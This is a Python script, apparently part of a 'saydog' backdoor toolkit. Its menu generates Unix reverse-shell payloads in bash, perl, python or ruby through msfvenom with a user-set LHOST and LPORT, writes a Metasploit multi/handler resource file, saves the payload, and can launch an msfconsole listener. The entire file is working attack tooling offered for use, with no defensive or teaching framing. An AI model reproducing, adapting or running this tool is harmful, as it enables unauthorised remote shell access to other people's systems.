#################### import modules ####################
import os
import sys
import time
import requests
import random
#################### fonts colors ####################
w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"
#################### main menu ####################
def menu():
        try:
                global host,port,fmt,ext
                print ("")
                print (w+"{"+p+"01"+w+"} payload bash cmd/unix/reverse_bash")
                print (w+"{"+p+"02"+w+"} payload perl cmd/unix/reverse_perl")
                print (w+"{"+p+"03"+w+"} payload python cmd/unix/reverse_python")
                print (w+"{"+p+"04"+w+"} payload ruby cmd/unix/reverse_ruby")
                print ("")
                print (w+"{"+p+"00"+w+"} Back to backdoor menu")
                print ("")
                dog = str(input(r+"saydog"+w+":"+p+"/cmd_unix/"+w+"> "))
                if dog == "0" or dog == "00" or dog == "back":
                        sys.exit(1)
                elif dog == "1" or dog == "01":
                        fmt = "bash"
                        ext = "sh"
                        pass
                elif dog == "2" or dog == "02":
                        fmt = "perl"
                        ext = "sh"
                        pass
                elif dog == "3" or dog == "03":
                        fmt = "python"
                        ext = "sh"
                        pass
                elif dog == "4" or dog == "04":
                        fmt = "ruby"
                        ext = "sh"
                        pass
                else:
                        sys.exit(1)
                print ("")
                addrs = str(input(w+"Do you want to use 127.0.0.1 as LHOST? (y/n) "))
                print ("")
                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                        host = "127.0.0.1"
                        print (b+"[+]"+w+" set LHOST: "+host)
                        pass
                else:
                        host = str(input(b+"[+]"+w+" set LHOST: "))
                        if  host == "" or host == " ":
                                host = "127.0.0.1"
                                print (b+"[+]"+w+" using default LHOST: "+host)
                                pass
                        else:
                                host = host
                                pass
                port = str(input(b+"[+]"+w+" set LPORT: "))
                if port == "" or port == " ":
                        port = "4444"
                        print (b+"[+]"+w+" using default LPORT: "+port)
                        pass
                else:
                        port = port
                        pass
                print (b+"[+]"+w+" configurating metasploit payloads")
                payload = "msfvenom -p cmd/unix/reverse_"+str(fmt)+" lhost="+str(host)+" lport="+str(port)+" -f raw -o payload."+ext
                print (b+"[+]"+w+" generating payload using msfvenom")
                os.system(payload+" &> /dev//null")
                os.system("echo 'use multi/handler' > saydog.rc")
                os.system("echo 'set payload cmd/unix/reverse_"+fmt+"' >> saydog.rc")
                os.system("echo 'set LHOST "+host+"' >> saydog.rc")
                os.system("echo 'set LPORT "+port+"' >> saydog.rc")
                os.system("echo 'show options' >> saydog.rc")
                print (g+"[+]"+w+" payload successfully generated")
                name = str(input(b+"[+]"+w+" set filename (example: payload): "))
                if name == "" or name == " ":
                        name = "payload"
                        pass
                else:
                        name = name
                        pass
                outp = str(input(b+"[+]"+w+" save file to (example: /sdcard): "))
                if outp == "" or outp == " ":
                        outp = "/sdcard"
                        pass
                else:
                        outp = outp
                        pass
                print ("")
                os.system("mv payload."+ext+" /"+outp+"/"+name+"."+ext)
                print (g+"[+]"+w+" file saved as:- "+g+outp+"/"+name+"."+ext+w)
                print ("")
                dog = str(input("Do you want to start listener? (y/n) "))
                if dog == "y" or dog == "Y" or dog == "yes" or dog == "Yes" or dog == "YES":
                        print ("")
                        os.system("msfconsole -q -r saydog.rc")
                        pass
                else:
                        pass
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        except KeyboardInterrupt:
                sys.exit(1)
        except ModuleNotFoundError:
                sys.exit(1)
        except NameError:
                sys.exit(1)
        except EOFError:
                sys.exit(1)
        except FileNotFoundError:
                sys.exit(1)
###################### main argv ####################
if "__main__" == __name__:
        if "--run" in sys.argv:
                menu()
        else:
                os.system("saydog")